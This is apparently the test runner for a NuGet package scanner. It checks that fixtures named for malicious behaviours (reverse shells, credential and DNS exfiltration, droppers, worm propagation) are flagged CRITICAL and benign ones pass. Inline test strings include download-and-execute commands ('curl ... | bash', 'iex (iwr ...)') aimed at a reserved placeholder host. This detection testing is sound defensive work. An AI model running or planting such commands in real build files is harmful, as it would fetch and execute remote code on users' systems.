#!/usr/bin/env python3
"""Canary + control tests.

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (shapes popular packages really ship) must scan SAFE. The fixtures are inert: hosts
are reserved (.invalid / TEST-NET), credentials are obviously fake, and nothing here is ever
built or executed.

    python tests/run.py
"""
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import nuget_audit as na  # noqa: E402

EXPECT = {
    "mal-exec-curl-sh": ("CRITICAL", "download_execute"),
    "mal-iex-download": ("CRITICAL", "download_execute"),
    "mal-encoded": ("CRITICAL", "encoded_exec"),
    "mal-inline-env-exfil": ("CRITICAL", "env_exfil"),
    "mal-nugetconfig-theft": ("CRITICAL", "credential_exfil"),
    "mal-ci-dropper": ("CRITICAL", "dropper"),
    "mal-persist-importbefore": ("CRITICAL", "persistence_write"),
    "mal-install-dropper": ("CRITICAL", "defender_tamper"),
    "mal-init-revshell": ("CRITICAL", "reverse_shell"),
    "mal-worm": ("CRITICAL", "worm_propagation"),
    "mal-script-ref": ("CRITICAL", "credential_exfil"),
    "mal-dns-exfil": ("CRITICAL", "dns_exfil"),
    "mal-init-jfrog-2023": ("CRITICAL", "dropper"),
    "mal-property-function": ("CRITICAL", "credential_exfil"),
}


def main():
    fails = 0
    root = os.path.join(HERE, "fixtures")
    for name in sorted(os.listdir(root)):
        fs, bs = na.files_from_dir(os.path.join(root, name))
        r = na.scan_package(fs, name, bs)
        ids = sorted({f["id"] for f in r["findings"]})
        if name.startswith("mal-"):
            want, fid = EXPECT[name]
            ok = na.SEV_ORDER[r["risk_level"]] >= na.SEV_ORDER[want] and fid in ids
        else:
            want, fid = "SAFE", "-"
            ok = r["risk_level"] == "SAFE"
        fails += not ok
        print("%s %-26s got=%-8s want=%-8s %-20s %s" % ("PASS" if ok else "FAIL", name, r["risk_level"], want, fid, ids))
    big = "<Project><Target Name=\"X\" BeforeTargets=\"Build\"><Exec Command=\"echo %s\" /></Target></Project>" % ("a" * 5000000)
    t0 = time.time()
    na.scan_package({"build/big.targets": big}, "big")
    big_s = time.time() - t0
    checks = [
        (na.scan("<Exec Command=\"curl https://x.invalid/a | bash\" />")["risk_level"] == "CRITICAL", "--text exec pipe-to-shell"),
        (na.scan("<Exec Command=\"git rev-parse HEAD\" />")["risk_level"] == "SAFE", "--text benign exec"),
        (na.scan("iex (iwr https://x.invalid/a.ps1)")["risk_level"] == "CRITICAL", "--text install.ps1 iex"),
        (na.split_spec("Serilog@3.1.1") == ("Serilog", "3.1.1"), "split versioned"),
        (na.split_spec("Serilog") == ("Serilog", "latest"), "split bare"),
        (na.project_specs(os.path.join(HERE, "data", "App.csproj")) ==
         ["Grpc.Tools@2.60.0", "Newtonsoft.Json@13.0.3", "Polly@8.2.0", "Serilog@3.1.1"], "csproj PackageReference + central versions"),
        (na.lock_specs(os.path.join(HERE, "data", "packages.lock.json")) == ["Serilog@3.1.1", "System.Memory@4.5.5"],
         "packages.lock.json"),
        (big_s < 8, "5 MB single-line build file in %.1fs" % big_s),
    ]
    for ok, label in checks:
        fails += not ok
        print("%s %s" % ("PASS" if ok else "FAIL", label))
    print("\n%d failure(s)" % fails)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
